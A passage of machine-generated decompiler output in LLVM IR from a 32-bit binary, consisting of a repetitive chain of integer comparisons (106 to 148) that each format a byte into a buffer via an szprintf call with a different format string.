  br i1 %v3_1000581c, label %dec_label_pc_10005824, label %dec_label_pc_1000586c

dec_label_pc_10005824:                            ; preds = %dec_label_pc_10005818
  %v2_10005824 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005838 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005838 = zext i8 %v3_10005838 to i32
  %v4_10005868 = call i32 @szprintf(i32 %v2_10005824, i32 ptrtoint ([13 x i8]* @global_var_10018160.167 to i32), i32 %v4_10005838)
  br label %dec_label_pc_1000586c

dec_label_pc_1000586c:                            ; preds = %dec_label_pc_10005818, %dec_label_pc_10005824
  %v3_10005870 = icmp eq i32 %v2_10003594, 106
  br i1 %v3_10005870, label %dec_label_pc_10005878, label %dec_label_pc_100058c0

dec_label_pc_10005878:                            ; preds = %dec_label_pc_1000586c
  %v2_10005878 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000588c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000588c = zext i8 %v3_1000588c to i32
  %v4_100058bc = call i32 @szprintf(i32 %v2_10005878, i32 ptrtoint ([13 x i8]* @global_var_10018170.168 to i32), i32 %v4_1000588c)
  br label %dec_label_pc_100058c0

dec_label_pc_100058c0:                            ; preds = %dec_label_pc_1000586c, %dec_label_pc_10005878
  %v3_100058c4 = icmp eq i32 %v2_10003594, 107
  br i1 %v3_100058c4, label %dec_label_pc_100058cc, label %dec_label_pc_10005914

dec_label_pc_100058cc:                            ; preds = %dec_label_pc_100058c0
  %v2_100058cc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100058e0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100058e0 = zext i8 %v3_100058e0 to i32
  %v4_10005910 = call i32 @szprintf(i32 %v2_100058cc, i32 ptrtoint ([13 x i8]* @global_var_10018180.169 to i32), i32 %v4_100058e0)
  br label %dec_label_pc_10005914

dec_label_pc_10005914:                            ; preds = %dec_label_pc_100058c0, %dec_label_pc_100058cc
  %v3_10005918 = icmp eq i32 %v2_10003594, 108
  br i1 %v3_10005918, label %dec_label_pc_10005920, label %dec_label_pc_10005968

dec_label_pc_10005920:                            ; preds = %dec_label_pc_10005914
  %v2_10005920 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005934 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005934 = zext i8 %v3_10005934 to i32
  %v4_10005964 = call i32 @szprintf(i32 %v2_10005920, i32 ptrtoint ([13 x i8]* @global_var_10018190.170 to i32), i32 %v4_10005934)
  br label %dec_label_pc_10005968

dec_label_pc_10005968:                            ; preds = %dec_label_pc_10005914, %dec_label_pc_10005920
  %v3_1000596c = icmp eq i32 %v2_10003594, 109
  br i1 %v3_1000596c, label %dec_label_pc_10005974, label %dec_label_pc_100059bc

dec_label_pc_10005974:                            ; preds = %dec_label_pc_10005968
  %v2_10005974 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005988 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005988 = zext i8 %v3_10005988 to i32
  %v4_100059b8 = call i32 @szprintf(i32 %v2_10005974, i32 ptrtoint ([13 x i8]* @global_var_100181a0.171 to i32), i32 %v4_10005988)
  br label %dec_label_pc_100059bc

dec_label_pc_100059bc:                            ; preds = %dec_label_pc_10005968, %dec_label_pc_10005974
  %v3_100059c0 = icmp eq i32 %v2_10003594, 110
  br i1 %v3_100059c0, label %dec_label_pc_100059c8, label %dec_label_pc_10005a10

dec_label_pc_100059c8:                            ; preds = %dec_label_pc_100059bc
  %v2_100059c8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100059dc = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100059dc = zext i8 %v3_100059dc to i32
  %v4_10005a0c = call i32 @szprintf(i32 %v2_100059c8, i32 ptrtoint ([12 x i8]* @global_var_100181b0.172 to i32), i32 %v4_100059dc)
  br label %dec_label_pc_10005a10

dec_label_pc_10005a10:                            ; preds = %dec_label_pc_100059bc, %dec_label_pc_100059c8
  %v3_10005a14 = icmp eq i32 %v2_10003594, 111
  br i1 %v3_10005a14, label %dec_label_pc_10005a1c, label %dec_label_pc_10005a64

dec_label_pc_10005a1c:                            ; preds = %dec_label_pc_10005a10
  %v2_10005a1c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005a30 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005a30 = zext i8 %v3_10005a30 to i32
  %v4_10005a60 = call i32 @szprintf(i32 %v2_10005a1c, i32 ptrtoint ([12 x i8]* @global_var_100181bc.173 to i32), i32 %v4_10005a30)
  br label %dec_label_pc_10005a64

dec_label_pc_10005a64:                            ; preds = %dec_label_pc_10005a10, %dec_label_pc_10005a1c
  %v3_10005a68 = icmp eq i32 %v2_10003594, 112
  br i1 %v3_10005a68, label %dec_label_pc_10005a70, label %dec_label_pc_10005ab8

dec_label_pc_10005a70:                            ; preds = %dec_label_pc_10005a64
  %v2_10005a70 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005a84 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005a84 = zext i8 %v3_10005a84 to i32
  %v4_10005ab4 = call i32 @szprintf(i32 %v2_10005a70, i32 ptrtoint ([12 x i8]* @global_var_100181c8.174 to i32), i32 %v4_10005a84)
  br label %dec_label_pc_10005ab8

dec_label_pc_10005ab8:                            ; preds = %dec_label_pc_10005a64, %dec_label_pc_10005a70
  %v3_10005abc = icmp eq i32 %v2_10003594, 113
  br i1 %v3_10005abc, label %dec_label_pc_10005ac4, label %dec_label_pc_10005b0c

dec_label_pc_10005ac4:                            ; preds = %dec_label_pc_10005ab8
  %v2_10005ac4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005ad8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005ad8 = zext i8 %v3_10005ad8 to i32
  %v4_10005b08 = call i32 @szprintf(i32 %v2_10005ac4, i32 ptrtoint ([13 x i8]* @global_var_100181d4.175 to i32), i32 %v4_10005ad8)
  br label %dec_label_pc_10005b0c

dec_label_pc_10005b0c:                            ; preds = %dec_label_pc_10005ab8, %dec_label_pc_10005ac4
  %v3_10005b10 = icmp eq i32 %v2_10003594, 114
  br i1 %v3_10005b10, label %dec_label_pc_10005b18, label %dec_label_pc_10005b60

dec_label_pc_10005b18:                            ; preds = %dec_label_pc_10005b0c
  %v2_10005b18 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005b2c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005b2c = zext i8 %v3_10005b2c to i32
  %v4_10005b5c = call i32 @szprintf(i32 %v2_10005b18, i32 ptrtoint ([13 x i8]* @global_var_100181e4.176 to i32), i32 %v4_10005b2c)
  br label %dec_label_pc_10005b60

dec_label_pc_10005b60:                            ; preds = %dec_label_pc_10005b0c, %dec_label_pc_10005b18
  %v3_10005b64 = icmp eq i32 %v2_10003594, 115
  br i1 %v3_10005b64, label %dec_label_pc_10005b6c, label %dec_label_pc_10005bb4

dec_label_pc_10005b6c:                            ; preds = %dec_label_pc_10005b60
  %v2_10005b6c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005b80 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005b80 = zext i8 %v3_10005b80 to i32
  %v4_10005bb0 = call i32 @szprintf(i32 %v2_10005b6c, i32 ptrtoint ([14 x i8]* @global_var_100181f4.177 to i32), i32 %v4_10005b80)
  br label %dec_label_pc_10005bb4

dec_label_pc_10005bb4:                            ; preds = %dec_label_pc_10005b60, %dec_label_pc_10005b6c
  %v3_10005bb8 = icmp eq i32 %v2_10003594, 116
  br i1 %v3_10005bb8, label %dec_label_pc_10005bc0, label %dec_label_pc_10005c08

dec_label_pc_10005bc0:                            ; preds = %dec_label_pc_10005bb4
  %v2_10005bc0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005bd4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005bd4 = zext i8 %v3_10005bd4 to i32
  %v4_10005c04 = call i32 @szprintf(i32 %v2_10005bc0, i32 ptrtoint ([13 x i8]* @global_var_10018204.178 to i32), i32 %v4_10005bd4)
  br label %dec_label_pc_10005c08

dec_label_pc_10005c08:                            ; preds = %dec_label_pc_10005bb4, %dec_label_pc_10005bc0
  %v3_10005c0c = icmp eq i32 %v2_10003594, 117
  br i1 %v3_10005c0c, label %dec_label_pc_10005c14, label %dec_label_pc_10005c5c

dec_label_pc_10005c14:                            ; preds = %dec_label_pc_10005c08
  %v2_10005c14 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005c28 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005c28 = zext i8 %v3_10005c28 to i32
  %v4_10005c58 = call i32 @szprintf(i32 %v2_10005c14, i32 ptrtoint ([14 x i8]* @global_var_10018214.179 to i32), i32 %v4_10005c28)
  br label %dec_label_pc_10005c5c

dec_label_pc_10005c5c:                            ; preds = %dec_label_pc_10005c08, %dec_label_pc_10005c14
  %v3_10005c60 = icmp eq i32 %v2_10003594, 118
  br i1 %v3_10005c60, label %dec_label_pc_10005c68, label %dec_label_pc_10005cb0

dec_label_pc_10005c68:                            ; preds = %dec_label_pc_10005c5c
  %v2_10005c68 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005c7c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005c7c = zext i8 %v3_10005c7c to i32
  %v4_10005cac = call i32 @szprintf(i32 %v2_10005c68, i32 ptrtoint ([14 x i8]* @global_var_10018224.180 to i32), i32 %v4_10005c7c)
  br label %dec_label_pc_10005cb0

dec_label_pc_10005cb0:                            ; preds = %dec_label_pc_10005c5c, %dec_label_pc_10005c68
  %v3_10005cb4 = icmp eq i32 %v2_10003594, 119
  br i1 %v3_10005cb4, label %dec_label_pc_10005cbc, label %dec_label_pc_10005d04

dec_label_pc_10005cbc:                            ; preds = %dec_label_pc_10005cb0
  %v2_10005cbc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005cd0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005cd0 = zext i8 %v3_10005cd0 to i32
  %v4_10005d00 = call i32 @szprintf(i32 %v2_10005cbc, i32 ptrtoint ([13 x i8]* @global_var_10018234.181 to i32), i32 %v4_10005cd0)
  br label %dec_label_pc_10005d04

dec_label_pc_10005d04:                            ; preds = %dec_label_pc_10005cb0, %dec_label_pc_10005cbc
  %v3_10005d08 = icmp eq i32 %v2_10003594, 120
  br i1 %v3_10005d08, label %dec_label_pc_10005d10, label %dec_label_pc_10005d58

dec_label_pc_10005d10:                            ; preds = %dec_label_pc_10005d04
  %v2_10005d10 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005d24 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005d24 = zext i8 %v3_10005d24 to i32
  %v4_10005d54 = call i32 @szprintf(i32 %v2_10005d10, i32 ptrtoint ([13 x i8]* @global_var_10018244.182 to i32), i32 %v4_10005d24)
  br label %dec_label_pc_10005d58

dec_label_pc_10005d58:                            ; preds = %dec_label_pc_10005d04, %dec_label_pc_10005d10
  %v3_10005d5c = icmp eq i32 %v2_10003594, 121
  br i1 %v3_10005d5c, label %dec_label_pc_10005d64, label %dec_label_pc_10005dac

dec_label_pc_10005d64:                            ; preds = %dec_label_pc_10005d58
  %v2_10005d64 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005d78 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005d78 = zext i8 %v3_10005d78 to i32
  %v4_10005da8 = call i32 @szprintf(i32 %v2_10005d64, i32 ptrtoint ([13 x i8]* @global_var_10018254.183 to i32), i32 %v4_10005d78)
  br label %dec_label_pc_10005dac

dec_label_pc_10005dac:                            ; preds = %dec_label_pc_10005d58, %dec_label_pc_10005d64
  %v3_10005db0 = icmp eq i32 %v2_10003594, 122
  br i1 %v3_10005db0, label %dec_label_pc_10005db8, label %dec_label_pc_10005e00

dec_label_pc_10005db8:                            ; preds = %dec_label_pc_10005dac
  %v2_10005db8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005dcc = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005dcc = zext i8 %v3_10005dcc to i32
  %v4_10005dfc = call i32 @szprintf(i32 %v2_10005db8, i32 ptrtoint ([13 x i8]* @global_var_10018264.184 to i32), i32 %v4_10005dcc)
  br label %dec_label_pc_10005e00

dec_label_pc_10005e00:                            ; preds = %dec_label_pc_10005dac, %dec_label_pc_10005db8
  %v3_10005e04 = icmp eq i32 %v2_10003594, 123
  br i1 %v3_10005e04, label %dec_label_pc_10005e0c, label %dec_label_pc_10005e54

dec_label_pc_10005e0c:                            ; preds = %dec_label_pc_10005e00
  %v2_10005e0c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005e20 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005e20 = zext i8 %v3_10005e20 to i32
  %v4_10005e50 = call i32 @szprintf(i32 %v2_10005e0c, i32 ptrtoint ([13 x i8]* @global_var_10018274.185 to i32), i32 %v4_10005e20)
  br label %dec_label_pc_10005e54

dec_label_pc_10005e54:                            ; preds = %dec_label_pc_10005e00, %dec_label_pc_10005e0c
  %v3_10005e58 = icmp eq i32 %v2_10003594, 124
  br i1 %v3_10005e58, label %dec_label_pc_10005e60, label %dec_label_pc_10005ea8

dec_label_pc_10005e60:                            ; preds = %dec_label_pc_10005e54
  %v2_10005e60 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005e74 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005e74 = zext i8 %v3_10005e74 to i32
  %v4_10005ea4 = call i32 @szprintf(i32 %v2_10005e60, i32 ptrtoint ([13 x i8]* @global_var_10018284.186 to i32), i32 %v4_10005e74)
  br label %dec_label_pc_10005ea8

dec_label_pc_10005ea8:                            ; preds = %dec_label_pc_10005e54, %dec_label_pc_10005e60
  %v3_10005eac = icmp eq i32 %v2_10003594, 125
  br i1 %v3_10005eac, label %dec_label_pc_10005eb4, label %dec_label_pc_10005efc

dec_label_pc_10005eb4:                            ; preds = %dec_label_pc_10005ea8
  %v2_10005eb4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005ec8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005ec8 = zext i8 %v3_10005ec8 to i32
  %v4_10005ef8 = call i32 @szprintf(i32 %v2_10005eb4, i32 ptrtoint ([13 x i8]* @global_var_10018294.187 to i32), i32 %v4_10005ec8)
  br label %dec_label_pc_10005efc

dec_label_pc_10005efc:                            ; preds = %dec_label_pc_10005ea8, %dec_label_pc_10005eb4
  %v3_10005f00 = icmp eq i32 %v2_10003594, 126
  br i1 %v3_10005f00, label %dec_label_pc_10005f08, label %dec_label_pc_10005f50

dec_label_pc_10005f08:                            ; preds = %dec_label_pc_10005efc
  %v2_10005f08 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005f1c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005f1c = zext i8 %v3_10005f1c to i32
  %v4_10005f4c = call i32 @szprintf(i32 %v2_10005f08, i32 ptrtoint ([13 x i8]* @global_var_100182a4.188 to i32), i32 %v4_10005f1c)
  br label %dec_label_pc_10005f50

dec_label_pc_10005f50:                            ; preds = %dec_label_pc_10005efc, %dec_label_pc_10005f08
  %v3_10005f54 = icmp eq i32 %v2_10003594, 127
  br i1 %v3_10005f54, label %dec_label_pc_10005f5c, label %dec_label_pc_10005fa4

dec_label_pc_10005f5c:                            ; preds = %dec_label_pc_10005f50
  %v2_10005f5c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005f70 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005f70 = zext i8 %v3_10005f70 to i32
  %v4_10005fa0 = call i32 @szprintf(i32 %v2_10005f5c, i32 ptrtoint ([13 x i8]* @global_var_100182b4.189 to i32), i32 %v4_10005f70)
  br label %dec_label_pc_10005fa4

dec_label_pc_10005fa4:                            ; preds = %dec_label_pc_10005f50, %dec_label_pc_10005f5c
  %v3_10005fa8 = icmp eq i32 %v2_10003594, 128
  br i1 %v3_10005fa8, label %dec_label_pc_10005fb0, label %dec_label_pc_10005ff8

dec_label_pc_10005fb0:                            ; preds = %dec_label_pc_10005fa4
  %v2_10005fb0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005fc4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005fc4 = zext i8 %v3_10005fc4 to i32
  %v4_10005ff4 = call i32 @szprintf(i32 %v2_10005fb0, i32 ptrtoint ([13 x i8]* @global_var_100182c4.190 to i32), i32 %v4_10005fc4)
  br label %dec_label_pc_10005ff8

dec_label_pc_10005ff8:                            ; preds = %dec_label_pc_10005fa4, %dec_label_pc_10005fb0
  %v3_10005ffc = icmp eq i32 %v2_10003594, 129
  br i1 %v3_10005ffc, label %dec_label_pc_10006004, label %dec_label_pc_1000604c

dec_label_pc_10006004:                            ; preds = %dec_label_pc_10005ff8
  %v2_10006004 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006018 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006018 = zext i8 %v3_10006018 to i32
  %v4_10006048 = call i32 @szprintf(i32 %v2_10006004, i32 ptrtoint ([13 x i8]* @global_var_100182d4.191 to i32), i32 %v4_10006018)
  br label %dec_label_pc_1000604c

dec_label_pc_1000604c:                            ; preds = %dec_label_pc_10005ff8, %dec_label_pc_10006004
  %v3_10006050 = icmp eq i32 %v2_10003594, 130
  br i1 %v3_10006050, label %dec_label_pc_10006058, label %dec_label_pc_100060a0

dec_label_pc_10006058:                            ; preds = %dec_label_pc_1000604c
  %v2_10006058 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000606c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000606c = zext i8 %v3_1000606c to i32
  %v4_1000609c = call i32 @szprintf(i32 %v2_10006058, i32 ptrtoint ([13 x i8]* @global_var_100182e4.192 to i32), i32 %v4_1000606c)
  br label %dec_label_pc_100060a0

dec_label_pc_100060a0:                            ; preds = %dec_label_pc_1000604c, %dec_label_pc_10006058
  %v3_100060a4 = icmp eq i32 %v2_10003594, 131
  br i1 %v3_100060a4, label %dec_label_pc_100060ac, label %dec_label_pc_100060f4

dec_label_pc_100060ac:                            ; preds = %dec_label_pc_100060a0
  %v2_100060ac = ptrtoint i32* %stack_var_-52 to i32
  %v3_100060c0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100060c0 = zext i8 %v3_100060c0 to i32
  %v4_100060f0 = call i32 @szprintf(i32 %v2_100060ac, i32 ptrtoint ([13 x i8]* @global_var_100182f4.193 to i32), i32 %v4_100060c0)
  br label %dec_label_pc_100060f4

dec_label_pc_100060f4:                            ; preds = %dec_label_pc_100060a0, %dec_label_pc_100060ac
  %v3_100060f8 = icmp eq i32 %v2_10003594, 132
  br i1 %v3_100060f8, label %dec_label_pc_10006100, label %dec_label_pc_10006148

dec_label_pc_10006100:                            ; preds = %dec_label_pc_100060f4
  %v2_10006100 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006114 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006114 = zext i8 %v3_10006114 to i32
  %v4_10006144 = call i32 @szprintf(i32 %v2_10006100, i32 ptrtoint ([13 x i8]* @global_var_10018304.194 to i32), i32 %v4_10006114)
  br label %dec_label_pc_10006148

dec_label_pc_10006148:                            ; preds = %dec_label_pc_100060f4, %dec_label_pc_10006100
  %v3_1000614c = icmp eq i32 %v2_10003594, 133
  br i1 %v3_1000614c, label %dec_label_pc_10006154, label %dec_label_pc_1000619c

dec_label_pc_10006154:                            ; preds = %dec_label_pc_10006148
  %v2_10006154 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006168 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006168 = zext i8 %v3_10006168 to i32
  %v4_10006198 = call i32 @szprintf(i32 %v2_10006154, i32 ptrtoint ([13 x i8]* @global_var_10018314.195 to i32), i32 %v4_10006168)
  br label %dec_label_pc_1000619c

dec_label_pc_1000619c:                            ; preds = %dec_label_pc_10006148, %dec_label_pc_10006154
  %v3_100061a0 = icmp eq i32 %v2_10003594, 134
  br i1 %v3_100061a0, label %dec_label_pc_100061a8, label %dec_label_pc_100061f0

dec_label_pc_100061a8:                            ; preds = %dec_label_pc_1000619c
  %v2_100061a8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100061bc = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100061bc = zext i8 %v3_100061bc to i32
  %v4_100061ec = call i32 @szprintf(i32 %v2_100061a8, i32 ptrtoint ([13 x i8]* @global_var_10018324.196 to i32), i32 %v4_100061bc)
  br label %dec_label_pc_100061f0

dec_label_pc_100061f0:                            ; preds = %dec_label_pc_1000619c, %dec_label_pc_100061a8
  %v3_100061f4 = icmp eq i32 %v2_10003594, 135
  br i1 %v3_100061f4, label %dec_label_pc_100061fc, label %dec_label_pc_10006244

dec_label_pc_100061fc:                            ; preds = %dec_label_pc_100061f0
  %v2_100061fc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006210 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006210 = zext i8 %v3_10006210 to i32
  %v4_10006240 = call i32 @szprintf(i32 %v2_100061fc, i32 ptrtoint ([13 x i8]* @global_var_10018334.197 to i32), i32 %v4_10006210)
  br label %dec_label_pc_10006244

dec_label_pc_10006244:                            ; preds = %dec_label_pc_100061f0, %dec_label_pc_100061fc
  %v3_10006248 = icmp eq i32 %v2_10003594, 136
  br i1 %v3_10006248, label %dec_label_pc_10006250, label %dec_label_pc_10006298

dec_label_pc_10006250:                            ; preds = %dec_label_pc_10006244
  %v2_10006250 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006264 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006264 = zext i8 %v3_10006264 to i32
  %v4_10006294 = call i32 @szprintf(i32 %v2_10006250, i32 ptrtoint ([13 x i8]* @global_var_10018344.198 to i32), i32 %v4_10006264)
  br label %dec_label_pc_10006298

dec_label_pc_10006298:                            ; preds = %dec_label_pc_10006244, %dec_label_pc_10006250
  %v3_1000629c = icmp eq i32 %v2_10003594, 137
  br i1 %v3_1000629c, label %dec_label_pc_100062a4, label %dec_label_pc_100062ec

dec_label_pc_100062a4:                            ; preds = %dec_label_pc_10006298
  %v2_100062a4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100062b8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100062b8 = zext i8 %v3_100062b8 to i32
  %v4_100062e8 = call i32 @szprintf(i32 %v2_100062a4, i32 ptrtoint ([13 x i8]* @global_var_10018354.199 to i32), i32 %v4_100062b8)
  br label %dec_label_pc_100062ec

dec_label_pc_100062ec:                            ; preds = %dec_label_pc_10006298, %dec_label_pc_100062a4
  %v3_100062f0 = icmp eq i32 %v2_10003594, 138
  br i1 %v3_100062f0, label %dec_label_pc_100062f8, label %dec_label_pc_10006340

dec_label_pc_100062f8:                            ; preds = %dec_label_pc_100062ec
  %v2_100062f8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000630c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000630c = zext i8 %v3_1000630c to i32
  %v4_1000633c = call i32 @szprintf(i32 %v2_100062f8, i32 ptrtoint ([13 x i8]* @global_var_10018364.200 to i32), i32 %v4_1000630c)
  br label %dec_label_pc_10006340

dec_label_pc_10006340:                            ; preds = %dec_label_pc_100062ec, %dec_label_pc_100062f8
  %v3_10006344 = icmp eq i32 %v2_10003594, 139
  br i1 %v3_10006344, label %dec_label_pc_1000634c, label %dec_label_pc_10006394

dec_label_pc_1000634c:                            ; preds = %dec_label_pc_10006340
  %v2_1000634c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006360 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006360 = zext i8 %v3_10006360 to i32
  %v4_10006390 = call i32 @szprintf(i32 %v2_1000634c, i32 ptrtoint ([13 x i8]* @global_var_10018374.201 to i32), i32 %v4_10006360)
  br label %dec_label_pc_10006394

dec_label_pc_10006394:                            ; preds = %dec_label_pc_10006340, %dec_label_pc_1000634c
  %v3_10006398 = icmp eq i32 %v2_10003594, 140
  br i1 %v3_10006398, label %dec_label_pc_100063a0, label %dec_label_pc_100063e8

dec_label_pc_100063a0:                            ; preds = %dec_label_pc_10006394
  %v2_100063a0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100063b4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100063b4 = zext i8 %v3_100063b4 to i32
  %v4_100063e4 = call i32 @szprintf(i32 %v2_100063a0, i32 ptrtoint ([13 x i8]* @global_var_10018384.202 to i32), i32 %v4_100063b4)
  br label %dec_label_pc_100063e8

dec_label_pc_100063e8:                            ; preds = %dec_label_pc_10006394, %dec_label_pc_100063a0
  %v3_100063ec = icmp eq i32 %v2_10003594, 141
  br i1 %v3_100063ec, label %dec_label_pc_100063f4, label %dec_label_pc_1000643c

dec_label_pc_100063f4:                            ; preds = %dec_label_pc_100063e8
  %v2_100063f4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006408 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006408 = zext i8 %v3_10006408 to i32
  %v4_10006438 = call i32 @szprintf(i32 %v2_100063f4, i32 ptrtoint ([13 x i8]* @global_var_10018394.203 to i32), i32 %v4_10006408)
  br label %dec_label_pc_1000643c

dec_label_pc_1000643c:                            ; preds = %dec_label_pc_100063e8, %dec_label_pc_100063f4
  %v3_10006440 = icmp eq i32 %v2_10003594, 142
  br i1 %v3_10006440, label %dec_label_pc_10006448, label %dec_label_pc_10006490

dec_label_pc_10006448:                            ; preds = %dec_label_pc_1000643c
  %v2_10006448 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000645c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000645c = zext i8 %v3_1000645c to i32
  %v4_1000648c = call i32 @szprintf(i32 %v2_10006448, i32 ptrtoint ([13 x i8]* @global_var_100183a4.204 to i32), i32 %v4_1000645c)
  br label %dec_label_pc_10006490

dec_label_pc_10006490:                            ; preds = %dec_label_pc_1000643c, %dec_label_pc_10006448
  %v3_10006494 = icmp eq i32 %v2_10003594, 143
  br i1 %v3_10006494, label %dec_label_pc_1000649c, label %dec_label_pc_100064e4

dec_label_pc_1000649c:                            ; preds = %dec_label_pc_10006490
  %v2_1000649c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100064b0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100064b0 = zext i8 %v3_100064b0 to i32
  %v4_100064e0 = call i32 @szprintf(i32 %v2_1000649c, i32 ptrtoint ([13 x i8]* @global_var_100183b4.205 to i32), i32 %v4_100064b0)
  br label %dec_label_pc_100064e4

dec_label_pc_100064e4:                            ; preds = %dec_label_pc_10006490, %dec_label_pc_1000649c
  %v3_100064e8 = icmp eq i32 %v2_10003594, 144
  br i1 %v3_100064e8, label %dec_label_pc_100064f0, label %dec_label_pc_10006538

dec_label_pc_100064f0:                            ; preds = %dec_label_pc_100064e4
  %v2_100064f0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006504 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006504 = zext i8 %v3_10006504 to i32
  %v4_10006534 = call i32 @szprintf(i32 %v2_100064f0, i32 ptrtoint ([13 x i8]* @global_var_100183c4.206 to i32), i32 %v4_10006504)
  br label %dec_label_pc_10006538

dec_label_pc_10006538:                            ; preds = %dec_label_pc_100064e4, %dec_label_pc_100064f0
  %v3_1000653c = icmp eq i32 %v2_10003594, 145
  br i1 %v3_1000653c, label %dec_label_pc_10006544, label %dec_label_pc_1000658c

dec_label_pc_10006544:                            ; preds = %dec_label_pc_10006538
  %v2_10006544 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006558 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006558 = zext i8 %v3_10006558 to i32
  %v4_10006588 = call i32 @szprintf(i32 %v2_10006544, i32 ptrtoint ([13 x i8]* @global_var_100183d4.207 to i32), i32 %v4_10006558)
  br label %dec_label_pc_1000658c

dec_label_pc_1000658c:                            ; preds = %dec_label_pc_10006538, %dec_label_pc_10006544
  %v3_10006590 = icmp eq i32 %v2_10003594, 146
  br i1 %v3_10006590, label %dec_label_pc_10006598, label %dec_label_pc_100065e0

dec_label_pc_10006598:                            ; preds = %dec_label_pc_1000658c
  %v2_10006598 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100065ac = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100065ac = zext i8 %v3_100065ac to i32
  %v4_100065dc = call i32 @szprintf(i32 %v2_10006598, i32 ptrtoint ([13 x i8]* @global_var_100183e4.208 to i32), i32 %v4_100065ac)
  br label %dec_label_pc_100065e0

dec_label_pc_100065e0:                            ; preds = %dec_label_pc_1000658c, %dec_label_pc_10006598
  %v3_100065e4 = icmp eq i32 %v2_10003594, 147
  br i1 %v3_100065e4, label %dec_label_pc_100065ec, label %dec_label_pc_10006634

dec_label_pc_100065ec:                            ; preds = %dec_label_pc_100065e0
  %v2_100065ec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006600 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006600 = zext i8 %v3_10006600 to i32
  %v4_10006630 = call i32 @szprintf(i32 %v2_100065ec, i32 ptrtoint ([13 x i8]* @global_var_100183f4.209 to i32), i32 %v4_10006600)
  br label %dec_label_pc_10006634

dec_label_pc_10006634:                            ; preds = %dec_label_pc_100065e0, %dec_label_pc_100065ec
  %v3_10006638 = icmp eq i32 %v2_10003594, 148
  br i1 %v3_10006638, label %dec_label_pc_10006640, label %dec_label_pc_10006688

dec_label_pc_10006640:                            ; preds = %dec_label_pc_10006634
  %v2_10006640 = ptrtoint i32* %stack_var_-52 to i32
